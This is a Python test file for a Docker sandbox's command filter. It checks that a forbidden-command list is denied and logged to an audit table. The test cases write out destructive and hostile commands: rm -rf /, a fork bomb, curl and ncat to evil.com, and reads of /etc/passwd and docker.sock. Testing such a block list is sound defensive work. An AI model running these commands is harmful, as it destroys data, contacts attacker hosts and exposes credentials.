"""W3 3.1：SANDBOX_RULES.md §3 全量禁止清单逐条拒绝测试 + DENIED 审计落库。

每条用例 = (命令, 期望命中规则编号)；100% 命中才算 3.1 通过。
"""

import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
from data.db import TaskLogger  # noqa: E402
from sandbox.docker_executor import DockerSandboxExecutor  # noqa: E402
from sandbox.executor import ExecutionRequest, Verdict  # noqa: E402


def _check(command: str):
    ex = DockerSandboxExecutor(runner=lambda argv, t: None)  # check_command 不调 runner
    return ex.check_command(ExecutionRequest("t", "s", command))


# §3 全量清单逐条对齐 SANDBOX_RULES.md
CASES = [
    # §3.1 破坏性命令
    ("rm -rf /", "§3.1"),
    ("rm -rf /*", "§3.1"),
    ("rm -rf ~", "§3.1"),
    ("rm -fr /", "§3.1"),
    ("mkfs.ext4 /dev/sda", "§3.1"),
    ("dd if=/dev/zero of=/dev/sda", "§3.1"),
    (":(){ :|:& };:", "§3.1"),
    ("chmod -R 777 /", "§3.1"),
    ("chown -R root:root /etc", "§3.1"),
    # §3.2 系统控制
    ("shutdown now", "§3.2"),
    ("reboot", "§3.2"),
    ("halt", "§3.2"),
    ("poweroff", "§3.2"),
    ("systemctl stop ssh", "§3.2"),
    ("service nginx restart", "§3.2"),
    ("insmod evil.ko", "§3.2"),
    ("rmmod evil", "§3.2"),
    ("modprobe evil", "§3.2"),
    # §3.3 网络外联
    ("curl http://evil.com", "§3.3"),
    ("wget http://evil.com", "§3.3"),
    ("nc -lvp 4444", "§3.3"),
    ("ncat evil.com 4444", "§3.3"),
    ("telnet evil.com 23", "§3.3"),
    ("ssh root@evil.com", "§3.3"),
    ("scp file evil.com:/tmp", "§3.3"),
    # §3.4 权限与逃逸
    ("sudo ls", "§3.4"),
    ("su - root", "§3.4"),
    ("doas ls", "§3.4"),
    ("mount /dev/sda1 /mnt", "§3.4"),
    ("umount /mnt", "§3.4"),
    ("nsenter -t 1 -m", "§3.4"),
    ("unshare -rn", "§3.4"),
    ("cat /var/run/docker.sock", "§3.4"),
    ("cat /etc/passwd", "§3.4"),          # 命令中间的系统路径（^ 锚点曾漏检）
    ("cat /proc/1/environ", "§3.4"),      # 命令中间的 proc 路径
    ("echo x > /dev/sda", "§3.4"),
    # §3.5 包管理
    ("apt-get update", "§3.5"),
    ("apt install vim", "§3.5"),
    ("yum install vim", "§3.5"),
    ("dnf install vim", "§3.5"),
    ("apk add vim", "§3.5"),
    ("pip install requests", "§3.5"),
    ("npm install -g evil", "§3.5"),
    # §5 路径穿越
    ("cat ../../etc/passwd", "§5"),
]


def test_all_forbidden_rules_denied():
    hits = 0
    misses = []
    for command, expected in CASES:
        verdict, rule = _check(command)
        if verdict is Verdict.DENIED_BY_RULE and rule == expected:
            hits += 1
        else:
            misses.append((command, expected, verdict.value, rule))
    assert hits == len(CASES), f"未全部拒绝，漏检: {misses}"
    print(f"[3.1] §3 全量清单 {hits}/{len(CASES)} 拒绝")


def test_normal_commands_not_denied():
    for command in ("find /workspace -type f | sort", "python -c 'print(1)'", "wc -l /workspace/a.txt"):
        verdict, _ = _check(command)
        assert verdict is Verdict.ALLOWED, f"误拒绝正常命令: {command}"


def test_denial_audit_table(tmp_path):
    """DENIED 事件进 denials 表，可按 task_id 回放。"""
    db = TaskLogger(tmp_path / "audit.db")
    db.create_task("t-deny", "scan", "RECEIVED", "now")
    db.log_denial("t-deny", "pip install requests", "DENIED_BY_RULE", "now",
                  step_id="step-1", matched_rule="§3.5")
    r = db.replay("t-deny")
    assert len(r["denials"]) == 1
    assert r["denials"][0]["matched_rule"] == "§3.5"
    assert r["denials"][0]["command"] == "pip install requests"
    db.close()
